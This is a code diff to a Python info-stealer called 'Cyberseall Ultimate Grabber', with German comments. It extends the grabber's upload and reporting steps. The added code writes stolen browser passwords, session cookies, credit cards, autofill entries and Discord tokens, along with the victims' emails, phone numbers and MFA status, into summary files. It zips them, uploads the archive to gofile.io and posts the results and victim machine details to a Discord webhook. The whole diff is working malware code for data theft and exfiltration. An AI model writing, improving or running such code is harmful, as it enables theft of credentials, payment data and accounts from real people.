@@ -715,13 +715,99 @@ class CyberseallGrabber:
 
     def up(self):
         try:
+            # Erstelle zusätzliche Zusammenfassungsdateien
+            try:
+                # Erstelle Browser-Zusammenfassung
+                if self.p:
+                    with open(os.path.join(self.d, "browser_summary.txt"), "w", encoding="utf-8") as f:
+                        f.write("🔥 CYBERSEALL BROWSER DATA SUMMARY 🔥\n")
+                        f.write("=" * 60 + "\n\n")
+                        
+                        # Gruppiere nach Datentyp
+                        passwords = [p for p in self.p if not p.startswith("COOKIE_") and not p.startswith("CREDIT_CARD") and not p.startswith("AUTOFILL_DATA")]
+                        cookies = [p for p in self.p if p.startswith("COOKIE_")]
+                        credit_cards = [p for p in self.p if p.startswith("CREDIT_CARD")]
+                        autofill = [p for p in self.p if p.startswith("AUTOFILL_DATA")]
+                        
+                        f.write(f"📊 STATISTICS:\n")
+                        f.write(f"🔑 Browser Passwords: {len(passwords)}\n")
+                        f.write(f"🍪 Session Cookies: {len(cookies)}\n")
+                        f.write(f"💳 Credit Cards: {len(credit_cards)}\n")
+                        f.write(f"📋 Autofill Data: {len(autofill)}\n")
+                        f.write(f"📁 Total Entries: {len(self.p)}\n\n")
+                        
+                        if passwords:
+                            f.write("🔑 BROWSER PASSWORDS:\n")
+                            f.write("-" * 40 + "\n")
+                            for pwd in passwords:
+                                f.write(pwd + "\n")
+                            f.write("\n")
+                        
+                        if cookies:
+                            f.write("🍪 SESSION COOKIES:\n")
+                            f.write("-" * 40 + "\n")
+                            for cookie in cookies:
+                                f.write(cookie + "\n")
+                            f.write("\n")
+                        
+                        if credit_cards:
+                            f.write("💳 CREDIT CARDS:\n")
+                            f.write("-" * 40 + "\n")
+                            for card in credit_cards:
+                                f.write(card + "\n")
+                            f.write("\n")
+                        
+                        if autofill:
+                            f.write("📋 AUTOFILL DATA:\n")
+                            f.write("-" * 40 + "\n")
+                            for auto in autofill:
+                                f.write(auto + "\n")
+                            f.write("\n")
+                
+                # Erstelle Token-Zusammenfassung
+                if self.vt:
+                    with open(os.path.join(self.d, "token_summary.txt"), "w", encoding="utf-8") as f:
+                        f.write("🎯 DISCORD TOKEN SUMMARY 🎯\n")
+                        f.write("=" * 60 + "\n\n")
+                        
+                        for i, token_info in enumerate(self.vt):
+                            f.write(f"TOKEN #{i+1}:\n")
+                            f.write(f"👤 Username: {token_info.get('username', 'Unknown')}#{token_info.get('discriminator', '0000')}\n")
+                            f.write(f"📧 Email: {token_info.get('email', 'Hidden')}\n")
+                            f.write(f"📱 Phone: {token_info.get('phone', 'None')}\n")
+                            f.write(f"💎 Nitro: {token_info.get('has_nitro', False)} ({token_info.get('nitro_days_left', 0)} days left)\n")
+                            f.write(f"🛡️ MFA: {token_info.get('mfa_enabled', False)}\n")
+                            f.write(f"✅ Verified: {token_info.get('verified', False)}\n")
+                            f.write(f"⭐ Premium: {token_info.get('premium_type', 0)}\n")
+                            f.write(f"🔐 Token: {token_info['token']}\n")
+                            f.write("-" * 50 + "\n\n")
+                
+                # Erstelle Gesamtstatistik
+                with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
+                    f.write("🔥 CYBERSEALL ULTIMATE GRABBER v5.0 🔥\n")
+                    f.write("=" * 60 + "\n\n")
+                    f.write("📊 FINAL STATISTICS:\n")
+                    f.write(f"🔑 Browser Passwords: {len(self.p)}\n")
+                    f.write(f"🎯 Raw Tokens: {len(set(self.t))}\n")
+                    f.write(f"✅ Valid Tokens: {len(self.vt)}\n")
+                    f.write(f"📁 Keyword Files: {len(self.f)}\n\n")
+                    f.write(f"💻 Target: {getpass.getuser()}@{os.getenv('COMPUTERNAME', 'Unknown')}\n")
+                    f.write(f"🌐 Platform: {platform.platform()}\n")
+                    f.write(f"⏰ Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write("=" * 60 + "\n")
+            except:
+                pass
+            
+            # Packe alle Dateien in ZIP
             with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                 for root, dirs, files in os.walk(self.d):
                     for file in files:
                         if not file.endswith('.zip'):
                             fp = os.path.join(root, file)
-                            zf.write(fp, os.path.relpath(fp, self.d))
+                            arc_name = os.path.relpath(fp, self.d)
+                            zf.write(fp, arc_name)
             
+            # Upload zu GoFile
             files = {"file": open(self.zf, "rb")}
             resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
             files["file"].close()
@@ -744,70 +830,87 @@ class CyberseallGrabber:
 
     def send(self):
         try:
+            # Zähle alle gesammelten Daten
+            total_passwords = len(self.p)
+            total_tokens = len(set(self.t))
+            valid_tokens = len(self.vt)
+            total_files = len(self.f)
+            
+            # Erstelle eine einzige umfassende Embed
+            embed_fields = [
+                {
+                    "name": "💎 ULTIMATE RESULTS",
+                    "value": f"```🔑 {total_passwords} Browser Passwords\n🎯 {total_tokens} Raw Tokens\n✅ {valid_tokens} Valid Tokens\n📁 {total_files} Keyword Files```",
+                    "inline": False
+                },
+                {
+                    "name": "💻 Target System",
+                    "value": f"```👤 {getpass.getuser()}\n🖥️ {os.getenv('COMPUTERNAME', 'Unknown')}\n🌐 {platform.platform()}```",
+                    "inline": False
+                }
+            ]
+            
+            # Füge Token-Informationen direkt in die Hauptembed ein
+            if len(self.vt) > 0:
+                for i, token_info in enumerate(self.vt[:3]):  # Max 3 Token in Hauptembed
+                    username = token_info.get('username', 'Unknown')
+                    discriminator = token_info.get('discriminator', '0000')
+                    email = token_info.get('email', 'Hidden')
+                    phone = token_info.get('phone', 'None')
+                    has_nitro = token_info.get('has_nitro', False)
+                    nitro_days = token_info.get('nitro_days_left', 0)
+                    mfa = token_info.get('mfa_enabled', False)
+                    verified = token_info.get('verified', False)
+                    premium = token_info.get('premium_type', 0)
+                    token = token_info['token']
+                    
+                    embed_fields.append({
+                        "name": f"🎯 DISCORD TOKEN #{i+1}",
+                        "value": f"```👤 {username}#{discriminator}\n📧 {email}\n📱 {phone}\n💎 Nitro: {has_nitro} ({nitro_days} days)\n🛡️ MFA: {mfa} | Verified: {verified}\n🔐 {token[:60]}...```",
+                        "inline": False
+                    })
+            
+            # Zeige Browser-Statistiken
+            if total_passwords > 0:
+                # Gruppiere Passwörter nach Browser
+                browser_stats = {}
+                for pwd_entry in self.p:
+                    browser = pwd_entry.split(" |")[0]
+                    if browser not in browser_stats:
+                        browser_stats[browser] = 0
+                    browser_stats[browser] += 1
+                
+                browser_summary = []
+                for browser, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
+                    browser_summary.append(f"{browser}: {count}")
+                
+                embed_fields.append({
+                    "name": "🌐 BROWSER BREAKDOWN",
+                    "value": f"```{chr(10).join(browser_summary)}```",
+                    "inline": False
+                })
+            
+            # Download-Link
+            embed_fields.append({
+                "name": "📁 DOWNLOAD ALL DATA",
+                "value": f"[**🔥 CLICK HERE TO DOWNLOAD 🔥**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
+                "inline": False
+            })
+            
             embed = {
                 "embeds": [{
-                    "title": "🔥 CYBERSEALL ULTIMATE GRABBER v4.2",
+                    "title": "🔥 CYBERSEALL ULTIMATE GRABBER v5.0 🔥",
+                    "description": "**MAXIMUM STEALTH DATA EXTRACTION COMPLETE**",
                     "color": 0xff0000,
-                    "fields": [
-                        {
-                            "name": "💎 Results",
-                            "value": "```" + str(len(set(self.t))) + " Raw Tokens\n" + str(len(self.vt)) + " Valid Tokens\n" + str(len(self.p)) + " Browser Passwords\n" + str(len(self.f)) + " Keyword Files```"
-                        },
-                        {
-                            "name": "💻 Target",
-                            "value": "```" + getpass.getuser() + "@" + os.getenv("COMPUTERNAME", "?") + "```"
-                        },
-                        {
-                            "name": "📁 Download",
-                            "value": "[**CLICK HERE TO DOWNLOAD**](" + str(self.link if hasattr(self, 'link') else 'Failed') + ")",
-                            "inline": False
-                        }
-                    ],
-                    "footer": {"text": "Cyberseall ULTIMATE Grabber v4.2 - Optimized Token Extraction"},
-                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
+                    "fields": embed_fields,
+                    "footer": {"text": "Cyberseall ULTIMATE v5.0 - Enhanced Browser Stealer + Session Hijacker"},
+                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime()),
+                    "thumbnail": {"url": "https://i.imgur.com/RL8Y2R8.png"}
                 }]
             }
             
             requests.post(self.w, json=embed, timeout=10)
             
-            # Sende alle validen Token mit Nitro-Info
-            if len(self.vt) > 0:
-                for i, token_info in enumerate(self.vt[:5]):  # Max 5 Token
-                    token_embed = {
-                        "embeds": [{
-                            "title": "✅ VALID TOKEN #" + str(i+1),
-                            "color": 0x00ff00,
-                            "fields": [
-                                {
-                                    "name": "👤 User",
-                                    "value": "```" + token_info.get('username', '?') + "#" + token_info.get('discriminator', '?') + "```"
-                                },
-                                {
-                                    "name": "📧 Email",
-                                    "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
-                                },
-                                {
-                                    "name": "📱 Phone",
-                                    "value": "```" + str(token_info.get('phone', 'None')) + "```"
-                                },
-                                {
-                                    "name": "💎 Nitro",
-                                    "value": "```Has Nitro: " + str(token_info.get('has_nitro', False)) + "\nDays Left: " + str(token_info.get('nitro_days_left', 0)) + "```"
-                                },
-                                {
-                                    "name": "🔐 Token",
-                                    "value": "```" + token_info['token'][:50] + "...```"
-                                },
-                                {
-                                    "name": "🛡️ Security",
-                                    "value": "```MFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "\nPremium: " + str(token_info.get('premium_type', 0)) + "```"
-                                }
-                            ],
-                            "footer": {"text": "Valid Token Info with Nitro"},
-                            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
-                        }]
-                    }
-                    requests.post(self.w, json=token_embed, timeout=5)
         except:
             pass
 
